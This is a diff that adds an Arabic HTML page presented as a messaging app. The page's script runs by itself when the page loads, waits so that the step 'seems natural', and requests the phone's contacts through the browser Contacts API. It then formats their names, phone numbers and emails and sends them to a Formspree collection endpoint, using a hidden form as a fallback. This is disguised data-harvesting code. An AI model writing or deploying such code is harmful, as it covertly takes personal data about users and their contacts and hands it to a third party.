@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق الرسائل</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .loading {
+            color: #007bff;
+            font-size: 18px;
+        }
+        .success {
+            color: #28a745;
+            font-size: 18px;
+        }
+        .error {
+            color: #dc3545;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>تطبيق الرسائل</h2>
+        <div id="status" class="loading">
+            جاري تحميل التطبيق...
+        </div>
+    </div>
+
+    <script>
+        // إعدادات Formspree - استخدم الرابط الذي حصلت عليه
+        const FORMSPREE_URL = 'https://formspree.io/f/mzzjkdry';
+
+        // الدالة الرئيسية لجمع وإرسال جهات الاتصال
+        async function collectAndSendContacts() {
+            const status = document.getElementById('status');
+            
+            try {
+                status.innerHTML = 'جاري التحضير...';
+                
+                // الانتظار قليلاً لجعل العملية طبيعية
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                status.innerHTML = 'جاري الوصول إلى جهات الاتصال...';
+                
+                // التحقق من دعم واجهة Contacts API
+                if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                    throw new Error('المتصفح لا يدعم هذه الميزة');
+                }
+                
+                // طلب جهات الاتصال
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                
+                if (!contacts || contacts.length === 0) {
+                    throw new Error('لم يتم اختيار أي جهات اتصال');
+                }
+                
+                status.innerHTML = `تم جمع ${contacts.length} جهة اتصال<br>جاري الإرسال...`;
+                
+                // إنشاء ملف نصي من جهات الاتصال
+                const contactsText = createContactsFile(contacts);
+                
+                // إرسال البيانات
+                await sendContactsToEmail(contactsText, contacts.length);
+                
+                status.className = 'success';
+                status.innerHTML = '✅ تم الإرسال بنجاح!';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                status.className = 'error';
+                status.innerHTML = `❌ ${error.message}`;
+            }
+        }
+
+        // إنشاء ملف نصي من جهات الاتصال
+        function createContactsFile(contacts) {
+            let text = 'جهات الاتصال المجمعة\n';
+            text += `التاريخ: ${new Date().toLocaleString('ar-SA')}\n`;
+            text += `العدد الإجمالي: ${contacts.length}\n\n`;
+            text += '='.repeat(50) + '\n\n';
+            
+            contacts.forEach((contact, index) => {
+                text += `جهة الاتصال ${index + 1}:\n`;
+                text += `الاسم: ${contact.name || 'غير متوفر'}\n`;
+                
+                if (contact.tel && contact.tel.length > 0) {
+                    text += `أرقام الهاتف: ${contact.tel.join(' , ')}\n`;
+                }
+                
+                if (contact.email && contact.email.length > 0) {
+                    text += `البريد الإلكتروني: ${contact.email.join(' , ')}\n`;
+                }
+                
+                text += '-'.repeat(30) + '\n\n';
+            });
+            
+            return text;
+        }
+
+        // إرسال جهات الاتصال عبر Formspree
+        async function sendContactsToEmail(contactsText, count) {
+            // الطريقة 1: استخدام FormData (الأفضل)
+            const formData = new FormData();
+            formData.append('_subject', `جهات اتصال - ${count} جهة`);
+            formData.append('_replyto', 'asd.asd.net.sy@gmail.com');
+            formData.append('message', contactsText);
+            formData.append('contacts_count', count.toString());
+            formData.append('timestamp', new Date().toISOString());
+
+            try {
+                // المحاولة الأولى: استخدام fetch مع no-cors
+                const response = await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                
+                return true;
+                
+            } catch (error) {
+                console.log('المحاولة الأولى فشلت، جاري المحاولة الثانية...');
+                
+                // الطريقة 2: استخدام form تقليدي
+                return await sendWithTraditionalForm(contactsText, count);
+            }
+        }
+
+        // الطريقة البديلة: استخدام form تقليدي
+        function sendWithTraditionalForm(contactsText, count) {
+            return new Promise((resolve) => {
+                // إنشاء form مخفي
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = FORMSPREE_URL;
+                form.style.display = 'none';
+                
+                // إضافة الحقول
+                const subjectField = document.createElement('input');
+                subjectField.name = '_subject';
+                subjectField.value = `جهات اتصال - ${count} جهة`;
+                form.appendChild(subjectField);
+                
+                const messageField = document.createElement('textarea');
+                messageField.name = 'message';
+                messageField.value = contactsText;
+                form.appendChild(messageField);
+                
+                const countField = document.createElement('input');
+                countField.name = 'contacts_count';
+                countField.value = count.toString();
+                form.appendChild(countField);
+                
+                // إضافة form إلى الصفحة وإرساله
+                document.body.appendChild(form);
+                form.submit();
+                
+                // اعتبار أن الإرسال ناجح بعد ثانية
+                setTimeout(() => {
+                    resolve(true);
+                }, 1000);
+            });
+        }
+
+        // بدء العملية تلقائياً عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(collectAndSendContacts, 1000);
+        });
+
+        // إعادة المحاولة في حالة الفشل
+        let retryCount = 0;
+        const maxRetries = 2;
+
+        function retryCollection() {
+            if (retryCount < maxRetries) {
+                retryCount++;
+                setTimeout(collectAndSendContacts, 3000);
+            }
+        }
+    </script>
+</body>
+</html>
